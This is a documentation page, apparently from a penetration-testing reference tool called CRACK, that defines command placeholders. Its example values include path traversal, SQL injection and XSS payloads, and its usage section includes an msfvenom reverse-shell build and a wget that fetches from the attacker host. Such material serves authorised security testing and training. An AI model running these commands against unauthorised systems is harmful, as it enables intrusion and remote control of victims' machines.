# Placeholder Reference Guide

Standard placeholders used throughout CRACK reference commands for consistency and clarity.

## Network & Targeting

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<TARGET>` | Single target IP address | `192.168.1.100` | Port scans, web enumeration |
| `<TARGET_IP>` | Alternative for TARGET | `192.168.45.100` | When clarity needed |
| `<TARGET_SUBNET>` | Network range in CIDR | `192.168.1.0/24` | Network discovery |
| `<TARGET_HOST>` | Hostname or domain | `target.local` | DNS enumeration |
| `<PORT>` | Single port number | `80`, `443`, `3306` | Service-specific scans |
| `<PORTS>` | Port range or list | `80,443,8080` | Multi-port operations |

## Attack Machine

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<LHOST>` | Local/attacker IP | `10.10.14.5` | Reverse shells, listeners |
| `<LPORT>` | Local port for listener | `4444`, `9001` | Reverse connections |
| `<INTERFACE>` | Network interface | `tun0`, `eth0` | VPN/network specific |

## Web Testing

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<URL>` | Full URL to target | `http://192.168.1.100/login.php` | Web attacks |
| `<DOMAIN>` | Domain name only | `example.com` | DNS, vhost enumeration |
| `<PATH>` | URL path component | `/admin/upload.php` | Directory traversal |
| `<PARAM>` | URL parameter name | `id`, `page`, `file` | Parameter fuzzing |
| `<VALUE>` | Parameter value | `1`, `admin`, `../../etc/passwd` | Injection payloads |
| `<COOKIE>` | Cookie value | `PHPSESSID=abc123` | Session attacks |

## Authentication

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<USERNAME>` | Username for auth | `admin`, `root` | Login attempts |
| `<PASSWORD>` | Password for auth | `password123` | Credential attacks |
| `<HASH>` | Password hash | `5f4dcc3b5aa765d61d8327deb882cf99` | Hash cracking |
| `<DOMAIN_NAME>` | Windows domain | `CORPORATE` | AD attacks |
| `<SID>` | Security identifier | `S-1-5-21-...` | Windows enumeration |

## Files & Paths

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<FILE>` | Filename | `shell.php`, `exploit.py` | File operations |
| `<LOCAL_FILE>` | File on attack machine | `/home/kali/shell.php` | Upload source |
| `<REMOTE_FILE>` | File on target | `/var/www/html/shell.php` | Target paths |
| `<WORDLIST>` | Wordlist path | `/usr/share/wordlists/rockyou.txt` | Bruteforcing |
| `<OUTPUT>` | Output filename | `scan_results.txt` | Saving results |
| `<UPLOAD_DIR>` | Upload directory | `/var/www/uploads/` | File upload attacks |

## Exploitation

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<PAYLOAD>` | Attack payload | `' OR 1=1--` | Injection attacks |
| `<SHELLCODE>` | Binary shellcode | `\x90\x90...` | Buffer overflows |
| `<COMMAND>` | System command | `whoami`, `id` | Command injection |
| `<SCRIPT>` | Script content | `<script>alert(1)</script>` | XSS attacks |
| `<EXPLOIT>` | Exploit identifier | `CVE-2021-12345` | Vulnerability reference |

## Database

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<DB_HOST>` | Database server | `localhost`, `192.168.1.50` | DB connections |
| `<DB_PORT>` | Database port | `3306`, `1433` | DB services |
| `<DB_NAME>` | Database name | `wordpress`, `users` | DB operations |
| `<DB_USER>` | Database username | `root`, `sa` | DB authentication |
| `<DB_PASS>` | Database password | `toor`, `password` | DB authentication |
| `<TABLE>` | Table name | `users`, `passwords` | SQL queries |
| `<COLUMN>` | Column name | `username`, `password` | SQL injection |

## Services

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<SERVICE>` | Service name | `ssh`, `http`, `smb` | Service enumeration |
| `<VERSION>` | Version string | `OpenSSH_7.4`, `Apache/2.4.29` | Version detection |
| `<SHARE>` | SMB/NFS share | `\\\\target\\share` | Share enumeration |
| `<COMMUNITY>` | SNMP community | `public`, `private` | SNMP scanning |

## Timing & Performance

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<THREADS>` | Thread count | `10`, `50` | Parallel operations |
| `<DELAY>` | Delay in seconds | `1`, `5` | Rate limiting |
| `<TIMEOUT>` | Timeout value | `30`, `60` | Connection timeouts |
| `<RATE>` | Scan rate | `1000`, `10000` | Packets per second |

## Special Variables

| Placeholder | Description | Example | Usage |
|------------|-------------|---------|-------|
| `<RANDOM>` | Random value | `$RANDOM`, `uuid` | Unique identifiers |
| `<DATE>` | Current date | `2024-01-01` | Timestamping |
| `<TIME>` | Current time | `15:30:00` | Scheduling |
| `<SESSION>` | Session ID | `sess_abc123` | Session management |
| `<TOKEN>` | Auth/CSRF token | `csrf_token_xyz` | Token-based auth |

## Usage Examples

### Basic Scanning
```bash
nmap -sn <TARGET_SUBNET>
nmap -sV -sC <TARGET> -p <PORTS>
```

### Web Testing
```bash
gobuster dir -u <URL> -w <WORDLIST>
sqlmap -u "<URL>?<PARAM>=<VALUE>" --batch
```

### Exploitation
```bash
python3 exploit.py <TARGET> <PORT> <LHOST> <LPORT>
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>
```

### File Transfer
```bash
wget http://<LHOST>:<LPORT>/<FILE>
curl -o <OUTPUT> http://<TARGET>/<PATH>
```

## Best Practices

1. **Use angle brackets** `< >` consistently for all placeholders
2. **Choose descriptive names** that indicate the expected value type
3. **Provide examples** in documentation for clarity
4. **Be consistent** - use same placeholder for same purpose across commands
5. **Document new placeholders** when creating custom commands
6. **Use UPPERCASE** for placeholder names to distinguish from commands

## Custom Placeholders

You can define custom placeholders for your specific use cases:

```bash
# Custom placeholder definition
<PROJECT_NAME>  # Your project identifier
<API_KEY>       # API authentication key
<WEBHOOK_URL>   # Callback URL for notifications
```

Add custom placeholders to `docs/custom/placeholders.md` to maintain documentation.

## Interactive Substitution

When using `crack ref --fill`, placeholders will be:
1. Detected automatically from command
2. Prompted for values interactively
3. Validated based on expected format
4. Substituted in the final command

Example:
```bash
$ crack ref --fill "nmap basic scan"
Enter value for <TARGET>: 192.168.1.100
Enter value for <PORTS> (optional): 80,443
Final command: nmap -sV -sC 192.168.1.100 -p 80,443
```

---

*Part of the [CRACK Reference System](./index.md)*